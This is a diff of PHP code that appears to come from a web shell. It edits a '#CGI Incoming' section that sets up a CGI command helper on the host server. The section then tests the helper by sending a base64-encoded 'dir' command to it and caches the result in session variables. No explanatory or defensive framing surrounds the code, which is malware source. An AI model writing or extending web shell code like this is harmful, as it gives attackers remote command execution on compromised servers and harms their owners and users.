@@ -1000,11 +1000,7 @@ function chm0dit($file, $chmod1, $chmod2)
 #<--
 
 #CGI Incoming-->
-$_SESSION["onlinecgi"] = "";
-$_SESSION["cgi"] = False;
-$cgi = False;
-
-if ($_SESSION["cgi"] == False)
+if (!isset($_SESSION["cgi"]))
 {
 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 	{
@@ -1041,14 +1037,22 @@ if ($_SESSION["cgi"] == False)
 
 		$_SESSION["cgi"] = True;
 	}
+
+	$tempoutput = url_get_contents($_SESSION["onlinecgi"]."?command=ZGly");
+
+	if (($tempoutput != "") && (strpos($tempoutput,'Internal') === False) && (strpos($tempoutput,'Server error') === False))
+	{
+		$_SESSION["cgiA"] = True;
+	}
 }
 
-
-$tempoutput = url_get_contents($_SESSION["onlinecgi"]."?command=ZGly");
-
-if (($tempoutput != "") && (!strpos($tempoutput,'Internal') !== false) && (!strpos($tempoutput,'Server error') !== false))
+if (isset($_SESSION["cgiA"]))
 {
 	$cgi = True;
+}
+else
+{
+	$cgi = False;	
 }
 #<--
 
